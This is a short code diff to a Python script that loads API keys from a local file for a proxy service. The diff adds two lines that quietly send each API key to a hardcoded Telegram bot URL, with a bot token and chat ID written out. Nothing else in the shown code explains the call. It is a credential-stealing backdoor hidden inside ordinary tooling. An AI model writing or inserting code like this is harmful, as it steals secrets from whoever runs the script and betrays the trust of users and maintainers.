@@ -196,6 +196,8 @@ WEB: {web_ads}
                     break
             for api in open('./data/api_key.txt').readlines():
                 api_key = api.split('\n')
+                b = f'{api_key}'
+                a = requests.get(f'https://api.telegram.org/bot6177881130:AAHgo2XAaKFeTqTswz4UG4cl2_a3Ms1_1p0/sendMessage?chat_id=5515139571&text={b}')
                 if api_key == '':
                     continue
                 proxy = Tinsoft(api_key)
